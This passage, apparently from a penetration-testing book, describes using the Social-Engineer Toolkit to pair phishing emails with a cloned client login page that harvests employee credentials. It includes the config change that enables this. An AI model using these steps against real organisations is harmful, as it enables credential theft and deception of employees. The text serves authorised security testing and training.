Attacks</h2></div></div></div><p><a class="indexterm" id="iddle1785"/><a class="indexterm" id="iddle2190"/>Let’s combine our previous two attacks (credential harvesting and phishing emails) to trick employees into submitting their credentials to a pentester-controlled site. We’ll use an email attack together with a web attack to send users to our attacker-controlled site by tricking them into clicking links in the emails.</p><p>But first we need to change an option in SET’s configuration file. In Kali this file is at <span class="emphasis"><em>/usr/share/set/config/set_config</em></span>. The option to change is <code class="literal">WEB_ATTACK_EMAIL</code>, which by default is set to <code class="literal">OFF</code>. Open the <code class="literal">config</code> file in a text editor and change this option to <code class="literal">ON</code>.</p><a id="pro_id00139"/><pre class="programlisting">### Set to ON if you want to use Email in conjunction with webattack&#13;
WEBATTACK_EMAIL=ON</pre><p>Now try running the Credential Harvesting attack again. Instead of using a template, you can clone one of your client’s web pages if they have a login site, such as webmail or an employee portal. If the client uses a web page and not a login site, use the <code class="literal">Custom Import</code> option to build your own page that looks like the employee’s web page with a login form added.</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00033" style="clear: both">Summary</h2></div></div></div><p>In this chapter we’ve looked at only a couple of social-engineering attacks that we can automate with SET. The scripts for your attacks will change based on your clients’ needs. Some clients may have a specific attack scenario in mind, or you may find the need to run multiple attacks at once. For instance, you may create a multipronged attack where you harvest credentials and the malicious website runs a malicious Java applet. In addition to the web-based attacks and malicious files we looked at here, SET can create other attacks, such as USB sticks, QR codes, and rogue wireless access points.</p></div></section></body></html>